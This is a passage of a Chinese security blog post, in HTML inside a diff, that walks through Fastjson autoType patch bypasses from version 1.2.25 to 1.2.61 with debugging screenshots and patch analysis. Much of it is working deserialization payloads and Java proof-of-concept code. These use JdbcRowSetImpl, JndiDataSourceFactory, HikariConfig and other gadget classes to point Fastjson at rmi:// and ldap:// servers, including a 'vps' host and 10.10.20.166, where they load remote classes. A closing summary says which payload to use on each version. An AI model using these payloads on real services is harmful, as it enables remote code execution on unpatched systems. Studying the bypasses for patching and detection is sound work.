+<tr>
+<td>0x8B2081CB3A50BD44L</td>
+<td>org.springframework.remoting.support.RemoteInvocation</td>
+</tr>
+<tr>
+<td>0x54DC66A59269BAE1L</td>
+<td>org.springframework.security.web.savedrequest.SavedCookie</td>
+</tr>
+<tr>
+<td>0x111D12921C5466DAL</td>
+<td>org.springframework.security.web.csrf.DefaultCsrfToken</td>
+</tr>
+<tr>
+<td>0x19DCAF4ADC37D6D4L</td>
+<td>org.springframework.security.web.authentication.WebAuthenticationDetails</td>
+</tr>
+<tr>
+<td>0x604D6657082C1EE9L</td>
+<td>org.springframework.security.core.context.SecurityContextImpl</td>
+</tr>
+<tr>
+<td>0xF4AA683928027CDAL</td>
+<td>org.springframework.security.authentication.UsernamePasswordAuthenticationToken</td>
+</tr>
+<tr>
+<td>0x92F252C398C02946L</td>
+<td>org.springframework.security.core.authority.SimpleGrantedAuthority</td>
+</tr>
+<tr>
+<td>0x6B949CE6C2FE009L</td>
+<td>org.springframework.security.core.userdetails.User</td>
+</tr>
+</tbody></table>
+<h1 id="3-1-2-25-1-2-41-补丁绕过："><a href="#3-1-2-25-1-2-41-补丁绕过：" class="headerlink" title="3. 1.2.25-1.2.41 补丁绕过："></a>3. 1.2.25-1.2.41 补丁绕过：</h1><p>当开启了<code>autoTypeSupport</code>，则会进行白名单，如果存在该类则直接加载，否则进行黑名单。</p>
+<p>那么可以在类名前面加<code>L</code>，末尾加<code>;</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:8085/bIZKZrFl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>payload如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:8085/bIZKZrFl\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>为什么这样就bypass了？看调试：</p>
+<p>开了<code>autoTypeSupport</code>之后白名单就为空。</p>
+<p><img src="/../../../blog_image/image-20240414111634704-1716861113343-73.png" srcset="/img/loading.gif" lazyload alt="image-20240414111634704"></p>
+<p>然后进行黑名单过滤，这里没有该类那么肯定绕过了黑名单。</p>
+<p><img src="/../../../blog_image/image-20240414111930869-1716861113343-74.png" srcset="/img/loading.gif" lazyload alt="image-20240414111930869"></p>
+<p>然后他是怎么加载该类的？调试到：<code>TypeUtils.loadClass</code>方法</p>
+<p><img src="/../../../blog_image/image-20240414112306195-1716861113343-76.png" srcset="/img/loading.gif" lazyload alt="image-20240414112306195"></p>
+<p>从mapping哈希表中查询是否有该类，结果是没有的，然后走下一步，获取该类是否是<code>L</code>，并且该类的末尾是<code>;</code></p>
+<p><img src="/../../../blog_image/image-20240414112511025-1716861113343-75.png" srcset="/img/loading.gif" lazyload alt="image-20240414112511025"></p>
+<p>最终使用截取，成功获取到该类：</p>
+<p><img src="/../../../blog_image/image-20240414112626851-1716861113344-77.png" srcset="/img/loading.gif" lazyload alt="image-20240414112626851"></p>
+<h1 id="4-1-2-25-1-2-42-补丁绕过："><a href="#4-1-2-25-1-2-42-补丁绕过：" class="headerlink" title="4. 1.2.25-1.2.42 补丁绕过："></a>4. 1.2.25-1.2.42 补丁绕过：</h1><p>我们知道这里调用了递归，去解析这个className，那么我们可以添加多对<code>[</code>和<code>;</code>进行绕过。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>	<span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="hljs-punctuation">,</span><br>	<span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span> <br>	<span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="5-1-2-25-1-2-43-补丁绕过："><a href="#5-1-2-25-1-2-43-补丁绕过：" class="headerlink" title="5. 1.2.25-1.2.43 补丁绕过："></a>5. 1.2.25-1.2.43 补丁绕过：</h1><p>payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>	<span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">,</span><br>	<span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><br>	<span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>如果开始是这样子写是错的！</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>	<span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>	<span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><br>	<span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>报错：</p>
+<p><img src="/../../../blog_image/image-20240414113744202-1716861113344-78.png" srcset="/img/loading.gif" lazyload alt="image-20240414113744202"></p>
+<p>表示的是期待需要一个<code>[</code>，而后面又是跟上<code>&#123;</code></p>
+<p>这样子写的话后面跟上<code>[&#123;</code>，就不会被解析：</p>
+<p><img src="/../../../blog_image/image-20240414114748746-1716861113344-79.png" srcset="/img/loading.gif" lazyload alt="image-20240414114748746"></p>
+<p>然后在<code>TypeUtils.loadClass()</code>函数中，除了前面看到的判断是否以”<code>L</code>”开头、以”<code>;</code>”结尾的if判断语句外，在其前面还有一个判断是否以”<code>[</code>“开头的if判断语句，是的话就提取其中的类名，并调用<code>Array.newInstance().getClass()</code>来获取并返回类，解析结果就是<code>com.sum.rowset.JdbcRowSetImpl</code></p>
+<p><img src="/../../../blog_image/image-20240414114333371-1716861113344-80.png" srcset="/img/loading.gif" lazyload alt="image-20240414114333371"></p>
+<h1 id="6-1-2-25-1-2-45-补丁绕过："><a href="#6-1-2-25-1-2-45-补丁绕过：" class="headerlink" title="6. 1.2.25-1.2.45 补丁绕过："></a>6. 1.2.25-1.2.45 补丁绕过：</h1><p><strong>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</strong></p>
+<p>payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;data_source&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:8085/bIZKZrFl&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>关键PoC：<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p>
+<p>低版本不存在该黑名单，但是高版本这个类我们在哈希黑名单中1.2.46的版本中可以看到：</p>
+<table>
+<thead>
+<tr>
+<th>version</th>
+<th>hash</th>
+<th>hex-hash</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.46</td>
+<td>-8083514888460375884</td>
+<td>0x8fd1960988bce8b4L</td>
+<td>org.apache.ibatis.datasource</td>
+</tr>
+</tbody></table>
+<p>导入坐标：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.42<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>在版本<code>1.2.42</code>中可以绕过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://127.0.0.1:8085/bIZKZrFl\&quot;&#125;&#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>这里对其进行了修复，如果类名前是<code>[</code>就直接抛出异常：</p>
+<p><img src="/../../../blog_image/image-20240414125738167-1716861113344-81.png" srcset="/img/loading.gif" lazyload alt="image-20240414125738167"></p>
+<p>后面由于<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>不在黑名单中，因此能成功绕过<code>checkAutoType()</code>函数的检测。</p>
+<p>设置了<code>properties</code>字段，因此会调用其<code>setter</code>方法，在<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory.java</code>的<code>setProperties</code>方法。</p>
+<p>很经典的jndi注入：</p>
+<p><img src="/../../../blog_image/image-20240414130125103-1716861113344-82.png" srcset="/img/loading.gif" lazyload alt="image-20240414130125103"></p>
+<p><img src="/../../../blog_image/image-20240414130204347-1716861113344-83.png" srcset="/img/loading.gif" lazyload alt="image-20240414130204347"></p>
+<h1 id="7-1-2-25-1-2-47-补丁绕过-重点-："><a href="#7-1-2-25-1-2-47-补丁绕过-重点-：" class="headerlink" title="7. 1.2.25-1.2.47 补丁绕过(重点)："></a>7. 1.2.25-1.2.47 补丁绕过(重点)：</h1><h2 id="Exp编写："><a href="#Exp编写：" class="headerlink" title="Exp编写："></a>Exp编写：</h2><p>本次Fastjson反序列化漏洞也是基于<code>checkAutoType()</code>函数绕过的，并且<strong>无需开启AutoTypeSupport</strong>，大大提高了成功利用的概率。</p>
+<p>一般的开发，都不配置fastjson的，即一般<code>autoTypeSupport</code>默认为关闭&#x3D;&#x3D;》黑名单过滤再白名单过滤。</p>
+<p>先看exp：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplPoc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span>  <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span><br>                + <span class="hljs-string">&quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span><br>                + <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里使用的是<code>1.2.42</code>，效果如下：</p>
+<p><img src="/../../../blog_image/image-20240414131501913-1716861113344-84.png" srcset="/img/loading.gif" lazyload alt="image-20240414131501913"></p>
+<p>原理：</p>
+<blockquote>
+<p>绕过的大体思路是通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，<code>checkAutoType()</code>就会抛出异常终止程序。</p>
+</blockquote>
+<h2 id="调试分析："><a href="#调试分析：" class="headerlink" title="调试分析："></a>调试分析：</h2><p>实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。</p>
+<p>但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：</p>
+<ul>
+<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li>
+<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li>
+</ul>
+<p>在调用<code>DefaultJSONParser.parserObject()</code>函数时，其会对JSON数据进行循环遍历扫描解析。</p>
+<p>第一次解析<code>java.lang.Class</code>这个类：</p>
+<p>由于<code>autoTypeSupport</code>为false，因此这个<code>if(autoTypeSupport || expectClass != null)</code>条件跳过。</p>
+<p>由于前面没有加载到这个<code>Class</code>，就会调用<code>TypeUtils#getClassFromMapping</code>，尝试冲map中获取该类。</p>
+<p>查询为null，就会继续走下一步，尝试使用<code>deserializers</code>这个map去加载这个class，这个map的vaule是<code>ObjectDeserializer</code>，最终返回这个class。</p>
+<p><img src="/../../../blog_image/image-20240414132908235-1716861113344-85.png" srcset="/img/loading.gif" lazyload alt="image-20240414132908235"></p>
+<p>然后调用了<code>MiscCodec#deserialze</code>这个方法，判断是否存在当前的vaulue是否存在<code>val</code>，如果存在则解析并且赋值给<code>objVal</code>。</p>
+<p><img src="/../../../blog_image/image-20240414133434822-1716861113344-86.png" srcset="/img/loading.gif" lazyload alt="image-20240414133434822"></p>
+<p>接着判断clazz是否为Class类，是的话调用<code>TypeUtils.loadClass()</code>加载strVal变量值指向的类：</p>
+<p><img src="/../../../blog_image/image-20240414134151168-1716861113344-87.png" srcset="/img/loading.gif" lazyload alt="image-20240414134151168"></p>
+<p>在<code>TypeUtils#loadClass 静态方法</code>先从map中尝试获取该类：</p>
+<p><img src="/../../../blog_image/image-20240414134257756-1716861113344-88.png" srcset="/img/loading.gif" lazyload alt="image-20240414134257756"></p>
+<p>然后调用当前线程的加载器去加载该类：</p>
+<p><img src="/../../../blog_image/image-20240414134345989-1716861113344-90.png" srcset="/img/loading.gif" lazyload alt="image-20240414134345989"></p>
+<p>并且把这个类添加到mappings中，即缓存起来。</p>
+<p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用<code>TypeUtils.getClassFromMapping()</code>时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过<code>checkAutoType()</code>检测：</p>
+<p>可以看到第二次扫描，<code>com.sun.rowset.JdbcRowSetImpl</code>这个类已经缓存到map中了，因此调用<code> deserializers.findClass(typeName)</code>直接获取到了，从而绕过了<code>autoTypeSupport</code></p>
+<p><img src="/../../../blog_image/image-20240414134729534-1716861113344-89.png" srcset="/img/loading.gif" lazyload alt="image-20240414134729534"></p>
+<p>总结：</p>
+<blockquote>
+<p>1.2.25-1.2.47的这个洞，在服务器不开启autotypesupport也可以实现rce，主要由于TypeUtils#getClassFromMapping会调用MiscCodec#deserialze方法，然后去解析vaule是<code>val</code>的字段，最终会TypeUtils.loadClass()，从mappings中判断是否存在该class，如果不存在则会放入mappings中（这里是第一次循环）。下一次循环的时候，调用<code>deserializers.findClass</code>就会从缓存中获取到这个class，最终直接获取到了这个class。</p>
+<p>这也给我们一个思路：payload是多段发送，第一次查询不到利用fastjson的缓存机制（java.lang.Class不是黑名单），再次加载则直接绕过。</p>
+</blockquote>
+<h2 id="补丁分析："><a href="#补丁分析：" class="headerlink" title="补丁分析："></a>补丁分析：</h2><p>由于1.2.47这个洞能够在不开启AutoTypeSupport实现RCE，因此危害十分巨大，看看是怎样修的。1.2.48中的修复措施是，在<code>loadClass()</code>时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</p>
+<p>调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。</p>
+<p>在<code>1.2.47</code>版本中，还是设置缓存。</p>
+<p><img src="/../../../blog_image/image-20240414141351614-1716861113344-91.png" srcset="/img/loading.gif" lazyload alt="image-20240414141351614"></p>
+<p>在<code>1.2.48</code>版本中的<code>MiscCodec#deserialze</code>，同理解析出<code>class</code>是<code>Class.class</code>，调用<code> TypeUtils.loadClass</code>，将不再设置缓存了。</p>
+<p><img src="/../../../blog_image/image-20240414141138805-1716861113344-92.png" srcset="/img/loading.gif" lazyload alt="image-20240414141138805"></p>
+<h1 id="8-版本"><a href="#8-版本" class="headerlink" title="8. 版本&lt;&#x3D; 1.2.61 通杀："></a>8. 版本&lt;&#x3D; 1.2.61 通杀：</h1><h2 id="fastjson1-2-5"><a href="#fastjson1-2-5" class="headerlink" title="fastjson1.2.5 &lt;&#x3D; 1.2.59"></a>fastjson1.2.5 &lt;&#x3D; 1.2.59</h2><p><strong>需要开启AutoType</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://vps:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://vps:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="fastjson1-2-5-1"><a href="#fastjson1-2-5-1" class="headerlink" title="fastjson1.2.5 &lt;&#x3D; 1.2.60"></a>fastjson1.2.5 &lt;&#x3D; 1.2.60</h2><p><strong>需要开启 autoType：</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;xaDataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;prefix&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="fastjson1-2-5-2"><a href="#fastjson1-2-5-2" class="headerlink" title="fastjson1.2.5 &lt;&#x3D; 1.2.61"></a>fastjson1.2.5 &lt;&#x3D; 1.2.61</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jndiName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploi&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>如果版本是&lt;&#x3D;1.2.47，那么可以使用一下payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>原因是fastjson中对于val关键字会进行解析，然后获取到这个字符串，之后会对这个字符串进行解析，最终获取到这个class，调用了TypeUtils.loadClass，由于在<code>1.2.47</code>版本之前，<code>TypeUtils.loadClass</code>方法是默认设置缓存的，因此在第一次调用后就会将这个class设置mappings中，第二次循环就会从mappings中获取到这个class，直接进行序列化了，从而绕过<code>checkAutoType</code>的校验。使用这个payload不需要开启<code>autoTypeSupport</code>。</p>
+<p>在<code>1.2.25</code>到<code>1.2.43</code>版本中可以尝试在<code>JdbcSetRowImpl</code>前面添加<code>L</code>末尾添加<code>;</code>，或者尝试<code>[</code>末尾添加<code>[&#123;</code>。</p>
+<p>在小于等于<code>1.2.45</code>版本可以尝试使用<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>进行jndi注入。</p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#autoTypeSupport">Java反序列化Fastjson篇03-Fastjson各版本绕过分析 | Drunkbaby’s Blog (drun1baby.top)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
